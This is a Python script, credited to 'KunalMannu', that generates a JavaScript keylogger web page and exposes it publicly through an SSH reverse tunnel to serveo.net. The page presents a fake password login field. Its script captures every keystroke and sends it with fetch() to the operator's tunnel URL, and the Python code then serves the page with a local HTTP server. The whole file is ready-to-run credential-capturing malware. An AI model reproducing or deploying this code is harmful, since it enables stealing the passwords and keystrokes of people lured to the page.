#Github ~ github.com/kunalmannu
#Made By KunalMannu
#If You Copy Give Me Credits
#Thank You

import os
import time
import sys
import os.path

os.system('clear')

print('''
\033[95m║\033[95m=============================\033[96m=============================║
\033[95m║\033[95m _______                  ______     \033[96m _     _             \033[96m║             
\033[95m║\033[95m(_______)                / _____)   \033[96m | |   | |            \033[96m║
\033[95m║\033[95m     _ _____ _   _ _____( (____ \033[93m_____\033[96m| |___| |_____ _   _ \033[96m║
\033[95m║\033[95m _  | (____ | | | (____ |\____ \033[93m(_____) \033[96m _   _) ___ | | | |\033[96m║
\033[95m║\033[95m| |_| / ___ |\ V // ___ |_____) )   \033[96m | |  \ \| ____| |_| |\033[96m║
\033[95m║\033[95m \___/\_____| \_/ \_____(______/    \033[96m |_|   \_)_____)\__  |\033[96m║
\033[95m║\033[93m                                                  \033[96m (____/ \033[96m║ 
\033[95m║              \033[95m|---[  By: Kunal\033[96mMannu ]---|                 \033[96m║
\033[95m║\033[95m=============================\033[96m=============================║
''')

file_exists = os.path.exists('index.html')

if file_exists is True:
    os.remove('index.html')
else:
  print('\n')

#os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | python -m http.server "')
os.system(f'gnome-terminal -- bash -c "stty raw -echo; (stty size; cat) | ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:8000 serveo.net"')

print("\033[96m [\033[97m*\033[96m] Paste The Link You Obtained From The Terminal eg:mervro.serveo.net ")
x = input('\033[93m :')

# if you want you could change the below html code
f = open("index.html", "a")
f.write('''<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JavaScript-Keylogger</title>
</head>
<body>
<center>
    <h1>Your Keylogs Are Being Recorded</h1>
    <h1>Login</h1>
Password:<input type="password">
</center>
    <script type="text/javascript">

var l = "";
var sl = "";
document.onkeydown = function(e){ 
    l += `${e.code}, `;
    sl += `${e.key}`;
    
    if(e.code === "Enter") // when Enter is pressed print the line in console
    { 
        console.log(l); //print code
        console.log(sl); //print char
        l = ""; //make null
        sl = ""; // make null 
    } 

    fetch(`https://'''+ x +'''?logger=${l,sl}`, { mode: 'no-cors'});
};
</script> 
</body>
</html>''')
f.close()
print('\033[93m [\033[97m*\033[93m] Loading Link:-')
animation = ("\033[93m ","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻","⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻"," ")

for i in range(len(animation)):
    time.sleep(0.1)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()
print('\033[96m [\033[97m*\033[96m] Your Link : \033[93m https://'+ x +'/index.html')

print("\033[96m [\033[97m*\033[96m] Loading Server:")


#animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
animation = ("\033[93m [■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]")

for i in range(len(animation)):
    time.sleep(0.4)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

print("\033[92m")

os.system('python -m http.server')
